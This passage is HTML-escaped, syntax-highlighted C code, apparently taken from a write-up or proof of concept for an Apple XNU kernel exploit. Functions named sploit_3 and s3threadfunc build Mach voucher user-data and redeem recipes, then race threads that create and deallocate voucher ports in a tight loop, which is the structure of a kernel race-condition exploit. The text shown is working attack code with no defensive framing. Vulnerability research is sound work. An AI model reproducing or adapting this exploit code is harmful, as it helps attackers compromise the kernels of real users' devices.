&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;((&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;uint8_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)+&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;sizeof&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; memcpy&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;content_buf&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;recipe2 &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*)(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;content_buf &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;+&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; recipe2&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;key &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; recipe2&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;command &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;template_size_out &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;recipe_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;struct&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;recipe_template_meta &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;void&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; size_t recipe_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;struct&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;recipe_template_meta single_recipe_template &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;struct&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;recipe_template_meta redeem_recipe_template &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;int&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;iter_limit &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;100000&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;void&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;s3threadfunc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;void&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;arg&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;struct&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;recipe_template_meta&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;template&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;struct&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;recipe_template_meta&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;arg&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;for&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;int&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;iter_limit&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;++)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_port_t voucher_port &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;create_voucher_from_recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;template&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;template&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_port_deallocate&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;mach_task_self&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(),&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;voucher_port&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;void&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;sploit_3&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;()&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;while&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;1&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;// choose a userdata size:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; uint32_t userdata_size &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;arc4random&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;()&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;%&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;2040&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)+&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;8&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; userdata_size &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;+=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;7&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; userdata_size &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(~&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;7&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c16\"&gt;&amp;quot;userdata size: 0x%x\\n&amp;quot;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;userdata_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; uint8_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;userdata_buffer &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;calloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;userdata_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;1&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;((&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;uint32_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;userdata_buffer&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;]&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;arc4random&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;((&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;uint32_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;userdata_buffer&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;1&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;]&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;arc4random&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;// build the templates: &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; single_recipe_template&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;create_single_variable_userdata_voucher_recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;userdata_buffer&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;userdata_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;single_recipe_template&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; redeem_recipe_template&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;create_single_variable_userdata_then_redeem_voucher_recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;userdata_buffer&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;userdata_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;redeem_recipe_template&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; free&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;userdata_buffer&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pthread_t single_recipe_thread&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pthread_create&lt;/span&gt;&lt;span 